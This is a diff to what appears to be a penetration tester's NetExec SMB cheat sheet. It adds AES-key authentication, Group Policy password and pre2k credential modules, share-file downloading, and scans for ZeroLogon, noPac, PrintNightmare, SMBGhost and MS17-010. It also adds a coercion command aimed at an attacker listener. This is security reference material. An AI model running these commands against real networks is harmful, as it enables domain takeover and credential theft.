@@ -30,6 +30,7 @@ nxc smb $IP -u '' -p <pass> -H <NTLM_HASH> --use-kcache -k --local-auth -d <doma
 -k                                                                 # kerberos Auth
 --pfx-cert / --pfx-base64 with --pfx-pass for PFX certificates     # pfx Auth
 --cert-pem with --key-pem                                          # Both key and cert Required to Auth
+--aesKey <aes_key>                                                 # AES keys 
 
 -d  or --kdcHost                                                   # Specify Domain Name and Fully Qualified Domain Name
 ```
@@ -68,6 +69,8 @@ nxc smb $IP  --users  --shares  --groups  --computers  --sessions  --rid-brute  
 ```bash
 nxc smb $ip -u '' -p ''
 
+-M gpp_password             # Find passwords in Group Policy Preferences
+-M pre2k                    # Pre2K Active Directory misconfigurations (Password will same as the username itself)
 -M timeroast                # Request Hash of the computer Accounts via sntp Protocal without credentials Required.
 --gen-relay-list            # Enumerate Hosts with SMB Signing Not Required (SMB Relay)
 --qwinsta                        # Enumerate Active Windows Sessions (Cross session Attack)
@@ -78,6 +81,26 @@ nxc smb $ip -u '' -p ''
 -M rdcman
 -M security-questions
 -M change-password -o USER=TargetUser NEWPASS=  or NEWHASH=    # Change password
+-M spider_plus -o DOWNLOAD_FLAG=true                           # Download shares files
+```
+## Scan for Top Vulnerabilities
+```bash
+nxc smb $ip -u '' -p ''
+
+-M zerologon            # ZeroLogon is a critical vulnerability that allows an attacker to completely take over a domain controller.
+-M nopac                # noPac enables domain user to domain admin privilege escalation by exploiting vulnerabilities in Active Directory's sAMAccountName spoofing and Kerberos PAC validation.
+-M printnightmare       # PrintNightmare allows remote code execution via the Print Spooler service.
+-M smbghost             # SMBGhost is a wormable vulnerability in SMBv3 compression.
+-M ms17-010             # The infamous NSA exploit used in WannaCry ransomware.
+-M ntlm_reflection      # NTLM Reflection is a newly discovered vulnerability from 2025.
+--gen-relay-list f.txt    # Identifies hosts vulnerable to SMB relay attacks where signing is not enforced.
+
+
+-M spooler               # Spooler Service Check
+-M webdav                # Spooler Service Check
+-M runasppl              # Check for RunAsPPL (Credential Guard)
+-M coerce_plus
+-M coerce_plus -o LISTENER=<AttackerIP> ALWAYS=true   # Checks for multiple coercion vulnerabilities including PetitPotam, DFSCoerce, PrinterBug, MSEven, and ShadowCoerce.
 ```
 ### Credential Dumping
 ```bash
